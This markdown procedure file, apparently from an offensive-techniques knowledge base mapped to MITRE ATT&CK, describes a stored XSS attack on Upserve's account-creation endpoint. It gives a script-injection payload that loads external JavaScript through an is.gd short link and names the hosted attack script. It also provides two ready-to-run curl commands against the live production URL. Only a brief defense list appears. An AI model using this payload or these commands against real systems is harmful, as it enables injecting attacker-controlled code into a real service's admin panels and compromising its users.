---
id: proc-submit-xss-uuid
tags:
  - xss
  - injection
  - account-creation
type: procedure
tools:
  - '[[tools/is-gd-url-shortener]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/post-create-user-with-xss-uuid-form-urlencoded]]'
  - '[[commands/post-create-user-with-xss-uuid-json]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:30:58.106Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Submit-Malicious-UUID-for-Account-Creation

## Summary

This procedure exploits the lack of server-side validation on the UUID parameter in the user account creation endpoint to inject a stored XSS payload, which is then stored in the database for later execution.

## Description

In vulnerable web applications like Upserve, the POST /c/user endpoint accepts a custom UUID without sanitizing for script tags or external resources. By closing an existing script tag and injecting a new one sourcing an external JS file via a shortened URL, attackers can store executable code. This targets contexts like admin panels where UUIDs are displayed in JavaScript objects (e.g., YUI.namespace). Prerequisites include access to the public registration endpoint and a URL shortener for payload compression.

## Requirements

1. Public access to POST /c/user endpoint
2. Valid email address for account creation
3. URL shortener service like is.gd to compress external JS links

## Defense

Defensive measures and detection strategies:

- Implement strict UUID format validation (e.g., regex for hex-only)
- Sanitize all user inputs with HTML entity encoding or CSP
- Monitor for anomalous UUID patterns in logs

## Objectives

1. Store XSS payload in database via account creation
2. Bypass character limits using shortened URLs
3. Set up for execution on payload rendering

## Instructions

### Step 1: Craft XSS Payload

**Context**: Create a payload that closes the parent script tag and injects a new one. Use is.gd to shorten the external JS URL (e.g., https://s3.amazonaws.com/cachemoney/upservexss.js) to fit limits.

Shorten the URL via [[tools/is-gd-url-shortener]] and form payload: `</script><script src=//is.gd/z0i2sU>`.

### Step 2: Submit via Form-URL-Encoded

**Context**: Send the initial request using form data to mimic browser submission.

**Command** ([[commands/post-create-user-with-xss-uuid-form-urlencoded]]):

```bash
curl -X POST https://app.upserve.com/c/user \
  -H "Accept: application/json" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: https://app.upserve.com/settings/account" \
  -d "uuid=\</script\><script src=//is.gd/z0i2sU>&email=your.email@example.com&brand_pretty_url=test-brand"
```

> This sends the payload; expect 201 response if accepted, or check if server overrides UUID.

### Step 3: Alternative JSON Submission

**Context**: If form fails, try JSON to test reproduction variations.

**Command** ([[commands/post-create-user-with-xss-uuid-json]]):

```bash
curl -X POST https://app.upserve.com/c/user \
  -H "Accept: application/json" \
  -H "Content-Type: application/json" \
  -H "Origin: https://app.upserve.com" \
  -d '{"uuid":"\</script\><script src=//is.gd/z0i2sU>","email":"your.email@example.com","brand_pretty_url":"test-brand"}'
```

> May return random UUID; verify in response if payload stored.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/post-create-user-with-xss-uuid-form-urlencoded]]
- [[commands/post-create-user-with-xss-uuid-json]]

## Tools Used

- [[tools/is-gd-url-shortener]]

## Tags

- xss
- injection
